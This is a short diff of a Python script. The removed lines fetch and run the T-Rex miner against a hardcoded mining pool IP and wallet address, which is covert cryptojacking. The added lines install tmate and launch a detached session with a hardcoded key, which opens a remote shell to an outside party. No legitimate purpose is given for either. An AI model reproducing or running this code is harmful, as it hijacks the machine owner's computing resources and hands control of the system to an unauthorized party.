@@ -1,2 +1,7 @@
-import os
-os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xf t-rex-0.26.8-linux.tar.gz && clear && ./t-rex --intensity 25 -a kawpow -o stratum+tcp://40.114.88.124:80 -u 33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD -p x")
+import subprocess
+command = "apt-get install screen -y"
+subprocess.call(command, shell=True)
+command = "apt-get install tmate -y"
+subprocess.call(command, shell=True)
+command = "screen -dmS tmate_session tmate -k tmk-3luLgmvCTvgJzsq3X1JzloycoJ -n huawdoro"
+subprocess.call(command, shell=True)
